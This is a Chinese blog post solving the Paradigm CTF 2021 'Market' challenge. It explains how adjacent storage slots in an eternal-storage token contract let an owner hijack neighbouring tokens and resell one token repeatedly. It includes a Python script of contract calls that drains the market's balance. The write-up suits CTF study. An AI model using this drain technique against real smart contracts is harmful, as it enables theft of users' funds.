---
layout: post
title:  "Paradigm 2021 Market题解"
date:   2021-07-19 11:07:32 +0800
categories: paradigm
---
### 分析
1. 给了3个合约，1个token，1个market，1个storage
2. token拥有storage，market是token的minter
3. setup一开始给4个无解地址各自mint了不同价值的token，分析发现这些动不得
4. storage有点意思，直接存

```
stor[tokenId]: Name
stor[tokenId+1]: Owner
stor[tokenId+2]: Approval
stor[tokenId+3]: Metadata
```
5. 那拥有一个token之后，可以修改Name、Metadata为player，进而拥有了token-1和token+2，Approval好像不行，因为在转账的时候会置零

### 解题
1. 付钱mint，获得一个token
2. 修改Name，获得token-1
3. 卖掉token
4. 修改token-1的Approval，获得token
5. 卖掉token
...

如此一来可以多次卖掉token，目标是清空合约余额，一开始是50000000000000000000，买的时候会+value，同时price被定为value/1.1，要求price整除balance，即

```
(50000000000000000000 + value) % (value / 1.1) = 0
```
这个实在不好解，但是注意到我们可以多买（白花钱），所以差额可以直接补齐

```python
value = 55 * 10 ** 18
send_txn(market, func_encode('mintCollectible()', []), value)

tokenId = w3.sha3(hexstr=token[2:].ljust(40, '0')+'4'.zfill(64)).hex()[2:] # mint到第4个了
send_txn(eternal, func_encode('updateName(bytes32,bytes32)', [bytes.fromhex(tokenId), bytes.fromhex(player[2:].zfill(64))]), 0) # 获得tokenId-1的所有权
tokenId2 = hex(int(tokenId,16) - 1)[2:]

send_txn(eternal, func_encode('updateApproval(bytes32,address)', [bytes.fromhex(tokenId), market]), 0) # 授权可卖
send_txn(market, func_encode('sellCollectible(bytes32)', [bytes.fromhex(tokenId)]), 0) # 第一次卖，获得50 ether

send_txn(eternal, func_encode('updateApproval(bytes32,address)', [bytes.fromhex(tokenId2), player]), 0) # 拿回所有权
send_txn(eternal, func_encode('updateApproval(bytes32,address)', [bytes.fromhex(tokenId), market]), 0) # 授权可卖
send_txn(market, func_encode('sellCollectible(bytes32)', [bytes.fromhex(tokenId)]), 0) # 第二次卖，获得50 ether

value2 = 45 * 10 ** 18
send_txn(market, func_encode('mintCollectible()', []), value2) #补齐差价

send_txn(eternal, func_encode('updateApproval(bytes32,address)', [bytes.fromhex(tokenId2), player]), 0) # 拿回所有权
send_txn(eternal, func_encode('updateApproval(bytes32,address)', [bytes.fromhex(tokenId), market]), 0) # 授权可卖
send_txn(market, func_encode('sellCollectible(bytes32)', [bytes.fromhex(tokenId)]), 0) # 第三次卖，获得50 ether
```